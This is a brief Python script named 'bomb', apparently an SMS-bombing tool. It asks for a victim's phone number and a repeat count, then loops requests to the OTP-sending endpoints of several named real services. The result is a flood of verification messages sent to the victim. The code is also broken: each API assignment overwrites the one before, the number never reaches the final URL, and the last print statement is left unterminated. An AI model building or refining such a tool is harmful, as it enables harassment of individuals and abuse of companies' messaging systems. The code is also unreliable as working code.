# bomb
Bomb
import requests

# GET
number=str(input( " Enter You Number : "))


api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

api="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"


api="https://api-v4-1.hungrynaki.com/graphql"

amount=int(input( " Enter Your Amount : "))

for i in range(amount):
    requests.get(api)
    print(str(i+1)+" SMS Sent
